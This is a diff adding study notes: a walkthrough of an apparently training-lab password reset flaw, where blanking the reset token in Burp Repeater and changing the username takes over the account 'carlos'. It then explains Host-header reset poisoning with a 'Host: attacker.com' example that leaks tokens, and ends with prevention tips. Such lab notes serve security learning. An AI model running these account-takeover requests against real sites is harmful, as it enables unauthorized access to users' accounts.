@@ -5302,3 +5302,466 @@ Never send passwords through email
 
 ---
 ![lab10](images/lab10.png)
+
+# Password Reset Poisoning Due to Missing Token Validation
+
+## Step 1: Request Password Reset
+
+1. Open the login page.
+2. Click:
+
+```text
+Forgot your password?
+```
+
+3. Enter your own username.
+
+Example:
+
+```text
+wiener
+```
+
+4. Submit the request.
+
+---
+
+## Step 2: Open Reset Email
+
+1. Click:
+
+```text
+Email client
+```
+
+2. Open the password reset email.
+3. Click the reset link.
+
+Example:
+
+```text
+/forgot-password?temp-forgot-password-token=abc123xyz
+```
+
+---
+
+## Step 3: Reset Your Password
+
+1. Enter a new password.
+2. Submit the form.
+
+Example:
+
+```text
+New Password: test123
+Confirm Password: test123
+```
+
+---
+
+## Step 4: Analyze Password Reset Requests
+
+1. Open Burp Suite.
+2. Go to:
+
+```text
+Proxy > HTTP History
+```
+
+3. Locate the password reset requests.
+
+Observe:
+
+```http
+GET /forgot-password?temp-forgot-password-token=abc123xyz
+```
+
+and
+
+```http
+POST /forgot-password?temp-forgot-password-token=abc123xyz
+```
+
+---
+
+## Step 5: Inspect the POST Request
+
+Notice the request contains:
+
+```http
+username=wiener
+new-password-1=test123
+new-password-2=test123
+```
+
+and also:
+
+```http
+temp-forgot-password-token=abc123xyz
+```
+
+Send this request to:
+
+```text
+Burp Repeater
+```
+
+---
+
+# Test Token Validation
+
+## Step 6: Remove the Token
+
+In Repeater remove the token value from:
+
+### URL
+
+From:
+
+```http
+POST /forgot-password?temp-forgot-password-token=abc123xyz
+```
+
+To:
+
+```http
+POST /forgot-password?temp-forgot-password-token=
+```
+
+---
+
+### Request Body
+
+From:
+
+```http
+temp-forgot-password-token=abc123xyz
+```
+
+To:
+
+```http
+temp-forgot-password-token=
+```
+
+---
+
+## Step 7: Send the Request
+
+Click:
+
+```text
+Send
+```
+
+Notice:
+
+```text
+Password reset still succeeds.
+```
+
+This confirms:
+
+```text
+The reset token is not being validated.
+```
+
+---
+
+# Exploit the Vulnerability
+
+## Step 8: Generate a Fresh Password Reset
+
+1. Return to the browser.
+2. Request another password reset for your own account.
+3. Open the reset email.
+4. Click the reset link.
+
+---
+
+## Step 9: Send the New Reset Request to Repeater
+
+Locate:
+
+```http
+POST /forgot-password?temp-forgot-password-token=<token>
+```
+
+Send it to:
+
+```text
+Repeater
+```
+
+---
+
+## Step 10: Remove Token Again
+
+Delete the token value from:
+
+### URL
+
+```http
+temp-forgot-password-token=
+```
+
+### Request Body
+
+```http
+temp-forgot-password-token=
+```
+
+---
+
+## Step 11: Change the Username
+
+Replace:
+
+```http
+username=wiener
+```
+
+with:
+
+```http
+username=carlos
+```
+
+---
+
+## Step 12: Set a New Password
+
+Example:
+
+```http
+new-password-1=hacked123
+new-password-2=hacked123
+```
+
+Request example:
+
+```http
+username=carlos
+new-password-1=hacked123
+new-password-2=hacked123
+temp-forgot-password-token=
+```
+
+---
+
+## Step 13: Send the Request
+
+Click:
+
+```text
+Send
+```
+
+Response:
+
+```text
+Password successfully changed.
+```
+
+Carlos's password is now:
+
+```text
+hacked123
+```
+
+(or whatever password you chose)
+
+---
+
+# Access Carlos Account
+
+## Step 14: Login as Carlos
+
+1. Open the login page.
+2. Enter:
+
+```text
+Username: carlos
+Password: hacked123
+```
+
+3. Login successfully.
+
+---
+
+## Step 15: Open My Account
+
+Click:
+
+```text
+My Account
+```
+
+The lab is solved.
+
+---
+
+# Vulnerability Explanation
+
+### Intended Flow
+
+```text
+Request Reset
+      ↓
+Receive Token
+      ↓
+Validate Token
+      ↓
+Reset Password
+```
+
+### Vulnerable Flow
+
+```text
+Request Reset
+      ↓
+Remove Token
+      ↓
+Change Username
+      ↓
+Reset Any User's Password
+```
+
+The application trusts:
+
+```text
+username
+```
+
+but fails to verify:
+
+```text
+temp-forgot-password-token
+```
+
+allowing attackers to reset passwords for arbitrary users.
+
+---
+-------
+## Topic: Password Reset Poisoning
+
+### Simple Idea
+
+When a website sends a password reset email, it generates a link like:
+
+```text
+https://website.com/reset-password?token=ABC123
+```
+
+The user clicks the link and resets their password.
+
+---
+
+## What is Password Reset Poisoning?
+
+A vulnerability where an attacker tricks the website into generating a password reset link that points to the attacker's domain instead of the legitimate website.
+
+As a result:
+
+1. The victim receives the reset email.
+2. The victim clicks the link.
+3. The reset token is sent to the attacker's server.
+4. The attacker uses the stolen token to reset the victim's password.
+
+---
+
+## Example
+
+### Normal Reset Email
+
+```text
+https://website.com/reset-password?token=ABC123
+```
+
+Token stays on the legitimate website.
+
+---
+
+### Vulnerable Scenario
+
+The website uses the HTTP `Host` header when generating the reset link.
+
+Attacker sends:
+
+```http
+Host: attacker.com
+```
+
+The website mistakenly creates:
+
+```text
+https://attacker.com/reset-password?token=ABC123
+```
+
+and emails it to the victim.
+
+---
+
+### What Happens Next?
+
+Victim clicks:
+
+```text
+https://attacker.com/reset-password?token=ABC123
+```
+
+The request reaches the attacker's server first.
+
+The attacker captures:
+
+```text
+token=ABC123
+```
+
+Now the attacker can use the token on the real website and reset the victim's password.
+
+---
+
+## Attack Flow
+
+```text
+Attacker
+    ↓
+Requests password reset
+    ↓
+Manipulates Host header
+    ↓
+Website generates malicious reset URL
+    ↓
+Victim receives email
+    ↓
+Victim clicks link
+    ↓
+Token sent to attacker
+    ↓
+Attacker resets victim's password
+```
+
+---
+
+## Why Does This Happen?
+
+The website:
+
+ Trusts user-controlled headers (such as `Host`)
+
+Instead of:
+
+ Using a fixed trusted domain name when generating password reset links.
+
+---
+
+## How to Prevent It?
+
+* Never trust the `Host` header from user requests.
+* Use a predefined domain name when generating reset URLs.
+* Validate allowed domains.
+* Use short-lived reset tokens.
+* Invalidate tokens immediately after use.
+
+---
